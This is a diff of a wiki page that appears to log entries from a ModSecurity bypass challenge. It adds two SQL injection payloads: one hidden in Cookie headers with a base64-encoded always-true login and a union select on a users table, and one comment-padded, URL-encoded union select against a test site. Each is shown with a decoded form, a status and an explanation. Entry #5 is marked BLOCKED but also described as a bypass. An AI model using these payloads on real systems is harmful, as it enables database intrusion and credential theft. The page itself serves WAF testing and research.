@@ -75,6 +75,50 @@ Explanation :
  * Multiple quotes
  * Uncommon characters : `, !`
 
-== Bypass #5 : ==
+== Bypass #5 : Travis Lee ==
 
+{{{
+Cookie: ASP.NET_SessionId=c0tx0o455d0b10ylsdr03m55; amSessionId=14408158863; amUserInfo=UserName=YWRtaW4=&
+Password=JyBvciAnMSc9JzEnLS0=; amUserId=1 union select username,password,3,4 from users
+}}}
 
+*Status : BLOCKED*
+
+Explanation :
+ * Multiple SQL keywords
+ * Multiple commas
+ * This one is really interesting, as mod_security was bypassed, not because of the pattern, but because of its location (Cookie Headers)
+
+== Bypass #6 : Roberto Salgado ==
+
+{{{
+http://www.modsecurity.org/testphp.vulnweb.com/artists.php?artist=-
+2%20div%201%20union%20all%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yea%0A
+%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0A%23fdsafdsafa%23f
+afsfaf%23%23yea%0A%23yeah%20babc%0A%23fdsafdsafa%23fafsfaf%23%23yeaah%0A%23yeah%20babc%0
+A%23fdsafdsafa%23fafsfaf%23%23yea...
+truncated
+...3fafsfaaf%23fafsfaaf%23fafsfaaf%23fafsfaaf%
+0Aselect%200x00,%200x41%20like/*!31337table_name*/,3%20from%20information_schema.tables%
+20limit%201
+}}}
+
+Decoded :
+
+{{{
+2 div 1 union all#yeaah
+#yeah babc
+#fdsafdsafa#fafsfaf##yea
+ #yeah babc
+#fdsafdsafa#fafsfaf##yeaah...
+truncated
+...
+like/*!31337table_name*/,3 from information_schema.tables...
+}}}
+
+*Status : BLOCKED*
+
+Explanation :
+ * Multiple SQL keywords
+ * SQL comments
+ * uncommon characters : `# , !`
